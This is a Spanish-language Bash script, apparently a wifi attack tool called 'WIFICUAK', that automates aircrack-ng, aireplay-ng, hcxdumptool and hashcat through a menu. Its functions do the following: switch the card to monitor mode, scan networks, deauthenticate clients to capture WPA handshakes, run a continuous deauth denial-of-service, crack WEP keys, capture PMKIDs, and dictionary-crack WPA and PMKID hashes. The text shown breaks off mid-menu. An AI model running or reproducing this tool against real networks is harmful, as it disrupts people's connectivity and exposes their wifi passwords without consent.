#!/bin/bash/

#X+X+X+X+X+X+X+X+X+X+X+X+X+
#Puntero hacia la interfaz
#X+X+X+X+X+X+X+X+X+X+X+X+X+
function selectInterface(){

tarjetas=$(ifconfig -a | cut -d " " -f 1 | sed 's/lo://g; s/:/\n\n/g; $d; $d; s/\(\b[a-z]\)/ \[\] \1/g' | sed ':a;N;$!ba;s/\n//g; s/\[\([^]]*\)\]/\n\1/g' | awk 'BEGIN{i=1} {if($1 !~ /^$/) {printf (" \033[1;31m[\033[0m\033[1;37m%d\033[0m\033[1;31m]\033[0m%s \n",i,$0); i++} else { print $0} } ')

printf "\n\n \033[1;31m[\033[0m\033[1;37m0\033[0m\033[1;31m]\033[0m volver"
printf "$tarjetas"
printf "\n\n  Seleccione una tarjeta: "

read tarjeta_mon

tarjetaStart=$(printf "$tarjetas" | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$tarjeta_mon+1" 2> /dev/null |  sed "s/ //g; s/^....//")
sacarNumero=$(printf "$tarjetas"  | cut -d "[" -f 5 | cut -d "]" -f 1 | sed s'/.$//' | cut -d "m" -f 2 | grep $tarjeta_mon 2>/dev/null)
sacarmondelfinal=$(printf "$tarjetaStart" | cut -d "m" -f 1 | sed 's/\(\b[a-z]\)/\1/g')
sacarModelo=$(iwconfig $tarjetaStart 2>/dev/null | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')

if [ "$(echo $sacarNumero)" == "" ] > /dev/null 2>&1;then
   sacarModelo=$(iwconfig null 2>/dev/null | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
fi

}

#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X
#Poner la tarjeta en modo monitor
#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X
function monitor(){

while :
do

clear
printf "************ Poner la tarjeta en modo monitor ************"
printf "\n\n Interfaz: \e[1;31m$tarjetaSeleccionada\e[0m | Modo: \e[1;31m$modoSeleccionado\e[0m | Frecuencia: \e[1;31m${frecuenciaOpera2}\e[0m"

selectInterface

if [ $tarjeta_mon == "0" ] > /dev/null 2>&1;then
   break
else
   if [ "$(echo $tarjeta_mon)" == "" ] > /dev/null 2>&1;then
      printf "\n  Seleccione la tarjeta correcta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
      if [ "$(echo ${sacarModelo})" == "$(echo Managed)" ] > /dev/null 2>&1;then
         if [ "$(echo $tarjeta_mon)" == "$(echo $sacarNumero)" ] > /dev/null 2>&1;then
            printf "\n  Cambiando ${tarjetaStart} a modo monitor..."
            airmon-ng check kill &>/dev/null
            airmon-ng start ${tarjetaStart} &>/dev/null
            tarjetas=$(ifconfig -a | cut -d " " -f 1 | sed 's/lo://g; s/:/\n\n/g; $d; $d; s/\(\b[a-z]\)/ \[\] \1/g' | sed ':a;N;$!ba;s/\n//g; s/\[\([^]]*\)\]/\n\1/g' | awk 'BEGIN{i=1} {if($1 !~ /^$/) {printf (" \033[1;31m[\033[0m\033[1;37m%d\033[0m\033[1;31m]\033[0m%s \n",i,$0); i++} else { print $0} } ')
            tarjetaStart=$(printf "$tarjetas" | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$tarjeta_mon+1" 2> /dev/null |  sed "s/ //g; s/^....//")
            if [ $auxtarjetamon == $sacarNumero ];then
               tarjetaSeleccionada=$(printf "$tarjetaStart")
               modoSeleccionado=$(iwconfig ${tarjetaStart} | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
            fi
            clear
            break
         else
            printf "\n  Seleccione la tarjeta correcta porfavor."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      else
         if [ "$(echo ${sacarModelo})" == "$(echo Monitor)" ] > /dev/null 2>&1;then
            printf "\n  Ya tienes la interfaz ${tarjetaStart} en modo monitor."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         else
            printf "\n  Seleccione la tarjeta correcta porfavor."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      fi
   fi
fi
done
}
#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X
#Poner la tarjeta en modo manager
#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X
function manager(){

while :
do

clear
printf "************ Poner la tarjeta en modo manager ************"
printf "\n\n Interfaz: \e[1;31m$tarjetaSeleccionada\e[0m | Modo: \e[1;31m$modoSeleccionado\e[0m | Frecuencia: \e[1;31m${frecuenciaOpera2}\e[0m"

selectInterface

if [ $tarjeta_mon == "0" ] > /dev/null 2>&1;then
   break
else
   if [ "$(echo $tarjeta_mon)" == "" ] > /dev/null 2>&1;then
      printf "\n  Seleccione la tarjeta correcta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
   if [ "$(echo ${sacarModelo})" == "$(echo Monitor)" ] ;then
      if [ "$(echo $tarjeta_mon)" == "$(echo $sacarNumero)" ] > /dev/null 2>&1;then
         printf "\n  Cambiando ${tarjetaStart} a modo manager..."
         airmon-ng stop ${tarjetaStart} &>/dev/null
         tarjetas=$(ifconfig -a | cut -d " " -f 1 | sed 's/lo://g; s/:/\n\n/g; $d; $d; s/\(\b[a-z]\)/ \[\] \1/g' | sed ':a;N;$!ba;s/\n//g; s/\[\([^]]*\)\]/\n\1/g' | awk 'BEGIN{i=1} {if($1 !~ /^$/) {printf (" \033[1;31m[\033[0m\033[1;37m%d\033[0m\033[1;31m]\033[0m%s \n",i,$0); i++} else { print $0} } ')
         tarjetaStart=$(printf "$tarjetas" | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$tarjeta_mon+1" 2> /dev/null |  sed "s/ //g; s/^....//")
         if [ $auxtarjetamon == $sacarNumero ];then
            tarjetaSeleccionada=$(printf "$tarjetaStart")
            modoSeleccionado=$(iwconfig ${tarjetaStart} | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
         fi
    clear
         break
      fi
   else
      if [ $(echo "$tarjetaStart") == $(echo "") ] > /dev/null 2>&1;then
         printf "\n  Seleccione la tarjeta correcta porfavor."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
         read -p ""
      else
         if [ $(echo "$tarjetaStart") == $(echo "${sacarmondelfinal}") ] ;then
            printf "\n  Ya tienes la interfaz ${tarjetaStart} en modo manager."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      fi
   fi
   fi
fi

done
}

#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+
#Seleccionar tarjeta de red en el menu
#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+
function interfazPrincipal(){

while :
do

clear
printf "************ Selecciona una interfaz ************"
printf "\n\n Interfaz: \e[1;31m$tarjetaSeleccionada\e[0m | Modo: \e[1;31m$modoSeleccionado\e[0m | Frecuencia: \e[1;31m${frecuenciaOpera2}\e[0m"

selectInterface

if [ $tarjeta_mon == "0" ] > /dev/null 2>&1;then
   break
else
   if [ "$(echo $tarjeta_mon)" == "" ] > /dev/null 2>&1;then
      printf "\n  Seleccione la tarjeta correcta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
      if [ "$(echo $tarjetaStart)" == "$(echo ${sacarmondelfinal})" ] || [ "$(echo $tarjetaStart)" == "$(echo ${sacarmondelfinal}mon)" ] > /dev/null 2>&1;then
         if [ "$(echo $tarjeta_mon)" == "$(echo $sacarNumero)" ] > /dev/null 2>&1;then
            printf "\n  Interfaz seleccionada ${tarjetaStart}."
            tarjetaSeleccionada=$(printf "$tarjetaStart")
            modoSeleccionado=$(iwconfig $tarjetaStart | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
            frecuenciaOpera2=$(iwlist $tarjetaStart frequency | sed -n '1d; 3p' | sed ':a;N;$!ba;s/\n//g' | cut -d ":" -f 2 | cut -b 2 | sed "s/ //g")
            frecuenciaOpera5=$(iwlist $tarjetaStart frequency | sed -n '1d; 15p' | sed ':a;N;$!ba;s/\n//g' | cut -d ":" -f 2 | cut -b 2 | sed "s/ //g")
            auxtarjetamon=$(printf "$tarjeta_mon")

            if [ $frecuenciaOpera2 == "2" ] && [ $frecuenciaOpera5 == "5" ];then
               frecuenciaOpera2=$(printf "$frecuenciaOpera2" | sed  's/\(2\)/\1.4GHz, /' && printf "$frecuenciaOpera5" | sed  's/\(5\)/\1GHz /') 
            else
               if [ $frecuenciaOpera2 == "5" ];then
                  frecuenciaOpera2=$(printf "$frecuenciaOpera2" | sed 's/\(5\)/\1GHz /')
               else
                  if [ $frecuenciaOpera2 == "2" ];then
                     frecuenciaOpera2=$(printf "$frecuenciaOpera2" | sed 's/\(2\)/\1GHz /')
                  fi
               fi
            fi
            clear
            break
         else
            printf "\n  Seleccione la tarjeta correcta porfavor."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      else
         printf "\n  Ya tienes la interfaz ${tarjetaStart} en modo monitor."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
         read -p ""
      fi
   fi
fi

done
}

#X+X+X+X+X+X+X+X+X+X+X+X+X
#Seleccion de la red wifi
#X+X+X+X+X+X+X+X+X+X+X+X+X

function select_wifi(){

clear

if [ "$(echo $tarjeta_mon)" == "" ];then
   printf "\n  Seleccione primero la tarjeta porfavor."
   printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
   read -p ""
else
   if [ "$(echo ${modoSeleccionado})" == "$(echo Monitor)" ] ;then

      printf "\n  Para detener el escaneo presione \e[1;31m[ctrl + c]\e[0m."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mempezar\e[0m."
      read -p ""

      xterm -e "airodump-ng -w /tmp/outputArNg --output-format csv ${tarjetaSeleccionada}"

      clear

      while :
         do

            printf "************ Seleccione la red ************\n\n\n"

            while IFS= read -r line; do
               macrepetidas=$(grep $line /tmp/outputArNg-01.csv | wc -l)
              
               if [[ "$macrepetidas" > 1 ]]; then
                  sed -i "s/${line}/+${line}/" /tmp/outputArNg-01.csv
               fi
            done < <(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')

            rojo=$(printf "\e[1;31m")
            extrojo=$(printf "\e[0m")

            launch_irodump=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/ *  /; s/    +/ *  /;s/+//g')
            printf "  Num          Bssid         CHN    Cifr    PWR       Essid\n******************************************************************\n$launch_irodump"
            printf "\n\n  \"*\" clientes conectados"
            printf "\n\n  Seleciona una red: "

            read num_mac_launch

            veri_num_mac_launch=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 1 | sed 's/,/  /g; /Station/,$d' | cut -d "]" -f 2 | sed 's/ //g' | sed "$ d" | nl | cut -d$'\t' -f1 | grep -m 1 $num_mac_launch 2> /dev/null | sed ':a;N;$!ba;s/\n//g' | sed "s/ //g" 2> /dev/null)
            bssid_seleccionada=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 1 | sed 's/,/   /g; /Station/,$d' | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$num_mac_launch" 2> /dev/null | sed 's/+//g')
            canal_selecionado=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 4 | sed 's/,/   /g; /Station/,$d' | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$num_mac_launch" 2> /dev/null | sed 's/+//g')
            cifrado_seleccionado=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 6 | sed 's/,/   /g; /Station/,$d' | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$num_mac_launch" 2> /dev/null | sed 's/+//g')
            essid_seleccionado=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 14 | sed 's/,/   /g; /Station/,$d' | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$num_mac_launch" 2> /dev/null | sed 's/+//g')

            sed -i 's/+//g' /tmp/outputArNg-01.csv

            if [ "$(echo $num_mac_launch)" == "" ] > /dev/null 2>&1;then
               printf "\n  Seleccione la opcion correcta porfavor."
               printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
               read -p ""
            else
               if [ "$(echo $num_mac_launch)" == "$(echo $veri_num_mac_launch)" ] > /dev/null 2>&1;then
                  break
               else
                  printf "\n  Seleccione la opcion correcta porfavor."
                  printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
                  read -p ""
               fi
            fi

            clear

      done
   else
      printf "\n  La tarjeta no esta en modo monitor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   fi
fi

rm /tmp/outputArNg-01.csv 2>/dev/null

}

#X+X+X+X+X+X+X+X+X
#Sacar handshake
#X+X+X+X+X+X+X+X+X
function Launcher_airodump-ng(){

clear

if [ "$(echo $tarjeta_mon)" == "" ];then
   printf "\n  Seleccione primero la tarjeta porfavor."
   printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
   read -p ""
else
   if [ "$(echo $num_mac_launch)" != "" ] ;then

      if [ "$(echo ${modoSeleccionado})" == "$(echo Monitor)" ] ;then

      clear

      while :
      do

         printf "\n Cuanto tiempo deseas que dure el sniffing. Default ${rojo}[${extrojo}30${rojo}]${extrojo}s: "

         read time_snif_airodump

         if [ "$(echo $time_snif_airodump)" == "" ] > /dev/null 2>&1;then
            time_snif_airodump=30
            break
         else
            if [ "$(echo $time_snif_airodump)" -ge 1 ] > /dev/null 2>&1;then
               break
            else
               printf "\n  El valor tiene que ser mayor a 1 segundo."
               printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
               read -p ""
            fi
         fi

         clear

      done

      while :
      do

         salir="false"

         xterm -geometry 93x25+9000+30 -hold -e "airodump-ng -w /tmp/capture --output-format pcap --bssid $bssid_seleccionada -c $canal_selecionado $tarjetaSeleccionada" & airodump_filter_xterm_PID=$!

         sleep 2;

         xterm -geometry 93x25+9000+390 -fg red -hold -e "aireplay-ng --deauth 0 -a $bssid_seleccionada --ignore-negative-one $tarjetaSeleccionada" & aireplay_xterm_PID=$!

         sleep $time_snif_airodump; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
         kill -9 $airodump_filter_xterm_PID; wait $airodump_filter_xterm_PID 2>/dev/null

         while :
         do

            verificar_handshake=$(aircrack-ng /tmp/capture-01.cap 2>/dev/null | grep -E "\([1-9][0-9]? handshake" | cut -d "(" -f 2 | sed 's/ handshake)//g')

            if [[ "$verificar_handshake" != 1 ]];then
               clear
               printf "\n  No se creo el handshake."
               printf " \n\n  Deseas volver a intentarlo? \e[1;31m[Y/N]\e[0m: "
               read decision_handshake

               if [ "$decision_handshake" == "Y" ] || [ "$decision_handshake" == "y" ];then
                  read "" 2>/dev/null
                  rm /tmp/capture-01.cap
                  break
               else
                  if [ "$decision_handshake" == "N" ] || [ "$decision_handshake" == "n" ];then
                     salir="break"
                     rm /tmp/capture-01.cap
                     break
                  else
                     clear
                     printf "\n  Seleccione la opcion correcta porfavor."
                     printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
                     read -p "" 
                     continue
                  fi
               fi
            else
               clear
               printf "\n  Conseguiste capturar el handshake, se encuentra en \e[1;31m/tmp/capture-01.cap\e[0m."
               printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
               read -p ""
               salir="break"
               break
            fi

         done

         $salir

      done

      else
         printf "\n  La tarjeta no esta en modo monitor."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
         read -p ""
      fi
   else
      printf "\n  Selecciona una red wifi a atacar."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   fi
fi
}
#X+X+X+X+X+X
#Ataque DOS
#X+X+X+X+X+X

function Attack_Dos(){
   clear

   if [ "$(echo $tarjeta_mon)" == "" ];then
      printf "\n  Seleccione primero la tarjeta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
      if [ "$(echo ${modoSeleccionado})" == "$(echo Monitor)" ] ;then
         if [ "$(echo $num_mac_launch)" != "" ] ;then
            printf "\n  Para detener el ataque presione \e[1;31m[ctrl + c]\e[0m."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mempezar\e[0m."
            read -p ""

            airmon-ng start $tarjetaSeleccionada $canal_selecionado &>/dev/null
            xterm -e "aireplay-ng -0 0 -a $bssid_seleccionada $tarjetaSeleccionada"
         else
            printf "\n  Selecciona una red wifi a atacar."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      else
         printf "\n  La tarjeta no esta en modo monitor."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
         read -p ""
      fi
   fi
}

#X+X+X+X+X+X
#Ataque WEP
#X+X+X+X+X+X

function Attack_Wep(){
   clear

   if [ "$(echo $tarjeta_mon)" == "" ];then
      printf "\n  Seleccione primero la tarjeta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
      if [ "$(echo ${modoSeleccionado})" == "$(echo Monitor)" ] ;then
         if [ "$(echo $num_mac_launch)" != "" ] ;then
            printf "\n  Para detener el ataque presione \e[1;31m[Enter]\e[0m."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mempezar\e[0m."
            read -p ""

            airmon-ng start $tarjetaSeleccionada $canal_selecionado &>/dev/null
            xterm -geometry 93x25+9000+30 -hold -e "airodump-ng -c $canal_selecionado --bssid $bssid_seleccionada -w /tmp/cracking-wep $tarjetaSeleccionada" & irodump_data_xterm_PID=$!
            sleep 5;
            xterm -geometry 93x25+9000+390 -hold -e  "aircrack-ng /tmp/cracking-wep-01.cap -l /tmp/key-wep.txt" & aircrack_wep_xterm_PID=$!

            while :
            do
               if [ "$(ls /tmp/key-wep.txt 2> /dev/null | wc -m)" -ne "0" ] ;then
                  kill -9 $irodump_data_xterm_PID; wait $irodump_data_xterm_PID 2>/dev/null
                  kill -9 $aircrack_wep_xterm_PID; wait $aircrack_wep_xterm_PID 2>/dev/null

                  clear

                  keywep=$(cat /tmp/key-wep.txt | xxd -r -p)

                  printf "\n  La contraseña es: \e[1;31m$keywep\e[0m"
                  printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31msalir\e[0m."
                  read -p ""

                  break
               fi

               if read -p ""; then
                  kill -9 $irodump_data_xterm_PID; wait $irodump_data_xterm_PID 2>/dev/null
                  kill -9 $aircrack_wep_xterm_PID; wait $aircrack_wep_xterm_PID 2>/dev/null

                  clear
                  break
               fi
            done
            rm /tmp/cracking-wep-0* 2>/dev/null
         else
            printf "\n  Selecciona una red wifi a atacar."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      else
         printf "\n  La tarjeta no esta en modo monitor."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
         read -p ""
      fi
   fi
}

#X+X+X+X+X+X+X+X+X+X+X
#Desencriptar WPA2WPA
#X+X+X+X+X+X+X+X+X+X+X

function Desencriptar_WPA2WPA(){
   clear

   while :
   do
      printf "\n  Introduzca la ruta del diccionario: "

      read diccionario_desencriptar

      if [ "$(ls $diccionario_desencriptar 2> /dev/null | wc -m)" == "0" ] ;then
         printf "\n  No se ah encuentrado el diccionario."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para volver a \e[1;31mintentar\e[0m."
         read -p ""
         clear
      else
         break
      fi
   done

   while :
   do
      printf "\n  Introduzca la ruta del handshake: "

      read handshake_desencriptar

      if [ "$(ls $handshake_desencriptar 2> /dev/null | wc -m)" == "0" ] ;then
         printf "\n  No se ah encuentrado el handshake."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para volver a \e[1;31mintentar\e[0m."
         read -p ""
         clear
      else
         break
      fi
   done

   clear

   aircrack-ng -w $diccionario_desencriptar $handshake_desencriptar

   printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
   read -p ""
}

#X+X+X+X+X+X+X
#Ataque PMKID
#X+X+X+X+X+X+X

function Attack_PMKID(){
clear

   if [ "$(echo $tarjeta_mon)" == "" ];then
      printf "\n  Seleccione primero la tarjeta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
      if [ "$(echo ${modoSeleccionado})" == "$(echo Monitor)" ] ;then
         if [ "$(echo $num_mac_launch)" != "" ] ;then
            printf "\n  Para detener el ataque presione \e[1;31m[ctrl + c]\e[0m."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mempezar\e[0m."
            read -p ""

            airmon-ng start $tarjetaSeleccionada $canal_selecionado &>/dev/null
            hcxdumptool -i $tarjetaSeleccionada -o /tmp/key-pmkid.pcapng --active_beacon --enable_status=15 --filtermode=2 --filterlist_ap=$bssid_seleccionada -c $canal_selecionado

            if [ "$(ls /tmp/key-pmkid.pcapng 2> /dev/null | wc -m)" == "0" ] ;then
               printf "\n  No se ah podido capturar el PMKID."
               printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31msalir\e[0m."
               read -p ""
            else
               printf "\n  Se pudo capturar el PMKID: \e[1;31m/tmp/key-pmkid.pcapng\e[0m"
               printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31msalir\e[0m."
               read -p ""
            fi
         else
            printf "\n  Selecciona una red wifi a atacar."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      else
         printf "\n  La tarjeta no esta en modo monitor."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
         read -p ""
      fi
   fi

}

#X+X+X+X+X+X+X+X+X+X
#Desencriptar PMKID
#X+X+X+X+X+X+X+X+X+X

function Desencriptar_PMKID(){
   clear

   while :
   do
      printf "\n  Introduzca la ruta del diccionario: "

      read diccionario_desencriptar_pmkid

      if [ "$(ls $diccionario_desencriptar_pmkid 2> /dev/null | wc -m)" == "0" ] ;then
         printf "\n  No se ah encuentrado el diccionario."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para volver a \e[1;31mintentar\e[0m."
         read -p ""
         clear
      else
         break
      fi
   done

   while :
   do
      printf "\n  Introduzca la ruta del pmkid: "

      read pmkid_desencriptar

      if [ "$(ls $pmkid_desencriptar 2> /dev/null | wc -m)" == "0" ] ;then
         printf "\n  No se ah encuentrado el pmkid."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para volver a \e[1;31mintentar\e[0m."
         read -p ""
         clear
      else
         break
      fi
   done

   clear

   hcxpcapngtool -o /tmp/key-pmkid.hc22000 $pmkid_desencriptar 2> /dev/null
   hashcat --hwmon-temp-abort=100 -a 0 -m 22000 -d 1 /tmp/key-pmkid.hc22000 $diccionario_desencriptar_pmkid

   printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31msalir\e[0m."
   read -p ""
}

function dependencies(){
   clear
   dependencies=(hashcat awk ip aircrack-ng xterm hcxdumptool hcxtools)
   dependencies_faltantes=()

   printf "[\033[1;31m*\033[0m] Comprobando programas necesarios...\033[0m\n"
   sleep 2

   for program in "${dependencies[@]}"; do
      printf "\n [\033[1;31m*\033[0m] Herramienta\e[0;35m\033[1m $program\033[0m..."

      comprobar_instalacion_test=$(test -f /usr/bin/$program;echo $?)
      comprobar_instalacion_apt=$(apt -qq list $program 2> /dev/null | cut -d "[" -f 2 | cut -d "]" -f1 | cut -d "," -f1)

      if [ $comprobar_instalacion_test == "0" ] || [ "$comprobar_instalacion_apt" == "installed" ]; then
         printf " (\e[0;32m\033[1mV\033[0m)"
      else
         printf " (\033[1;31mX\033[0m)"
         dependencies_faltantes=("${dependencies_faltantes[@]}" $program)
      fi

      sleep 0.5
   done
   
   if [ ! -z $dependencies_faltantes ] > /dev/null 2>&1;then
      while :
         do
         printf "\n\nHay algunas dependencias que no se encontraron en su equipo ¿desas instalarlas? [Y/N]: "
         read instalar
         if [ $instalar == "y" ] || [ $instalar == "Y" ] ;then
            if [ "$(ping -c 1 8.8.8.8 > /dev/null; echo $?)" == "0" ] ;then
               printf "\n"
               for program in "${dependencies_faltantes[@]}"
                  do
                     printf " [\033[1;31m*\033[0m] Instalando herramienta \033[0m\e[0;36m\033[1m$program\033[0m...\n"
                     apt-get install $program -y > /dev/null 2>&1
               done
               printf "\n  ---------------------------------------------------------"
               printf "\n\n  Instalado correctamente."
               printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
               read -p "" 
               clear

               break
            else
               printf "\n  Revista la salida de conexion a \e[1;31minternet\e[0m es obligatorio para instalar los repositorios."
                printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
                read -p "" 
                clear
            fi
         else
            if [ $instalar == "n" ] || [ $instalar == "N" ] ;then
               break
            else
                  printf "\n  Seleccione la opcion correcta porfavor."
                  printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
                  read -p "" 
                  clear
            fi
         fi    
      done
   else
      printf "\n\n  Estan todas las dependencias necesarias."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   fi

}

while :
do

clear
echo -e "\e[1;31m"
echo -e " ██     ██ ██ ███████ ██  ██████ ██    ██  █████  ██   ██ "
echo -e " ██     ██ ██ ██      ██ ██      ██    ██ ██   ██ ██  ██  "
echo -e " ██  █  ██ ██ █████   ██ ██      ██    ██ ███████ █████   "
echo -e " ██ ███ ██ ██ ██      ██ ██      ██    ██ ██   ██ ██  ██  "
echo -e "  ███ ███  ██ ██      ██  ██████  ██████  ██   ██ ██   ██ \e[0m"

printf "\n Herramienta solo para el uso etico"
printf "\n By N1P0STK4"

printf "\n\n Interfaz: \e[1;31m$tarjetaSeleccionada\e[0m | Modo: \e[1;31m$modoSeleccionado\e[0m | Frecuencia: \e[1;31m${frecuenciaOpera2}\e[0m"

if [ "$(echo $num_mac_launch)" == "" ];then
   printf ""
else
   printf "\n\n                            Wifi Seleccionado"
   printf "\n\n Essid: \e[1;31m$essid_seleccionado\e[0m | Bssid: \e[1;31m$bssid_seleccionada\e[0m | Canal: \e[1;31m${canal_selecionado}\e[0m | Cifrado: \e[1;31m${cifrado_seleccionado}\e[0m"
fi
printf "\n\n \e[1;31m[\e[0m\e[1;37m0\e[0m\e[1;31m]\e[0m Salir del script."
printf "\n \e[1;31m[\e[0m\e[1;37m1\e[0m\e[1;31m]\e[0m Tarjeta modo monitor."
printf "\n \e[1;31m[\e[0m\e[1;37m2\e[0m\e[1;31m]\e[0m Tarjeta modo manager."
printf "\n \e[1;31m[\e[0m\e[1;37m3\e[0m\e[1;31m]\e[0m Seleccionar interfaz."
printf "\n \e[1;31m[\e[0m\e[1;37m4\e[0m\e[1;31m]\e[0m Seleccionar wifi a auditar."
printf "\n\n \e[1;31m[\e[0m\e[1;37m5\e[0m\e[1;31m]\e[0m Desencriptar WPA/WPA2."
printf "\n \e[1;31m[\e[0m\e[1;37m6\e[0m\e[1;31m]\e[0m Obtener handshake."
printf "\n \e[1;31m[\e[0m\e[1;37m7\e[0m\e[1;31m]\e[0m Ataque DOS."
printf "\n \e[1;31m[\e[0m\e[1;37m8\e[0m\e[1;31m]\e[0m Ataque WEP."
printf "\n \e[1;31m[\e[0m\e[1;37m9\e[0m\e[1;31m]\e[0m Ataque PMKID."
printf "\n \e[1;31m[\e[0m\e[1;37m10\e[0m\e[1;31m]\e[0m Desencriptar PMKID."
printf "\n\n \e[1;31m[\e[0m\e[1;37m99\e[0m\e[1;31m]\e[0m Añadir repositorios necesarios."

printf "\n\n  Opcion a elegir: "
read opcion

case $opcion in
  #Salir del menu.
  0)
    printf "\n  Vuelve pronto ;) \n\n"
    exit 0
  ;;
  1)
    monitor
  ;;
  2)
    manager
  ;;
  3)
    interfazPrincipal
  ;;
  4)
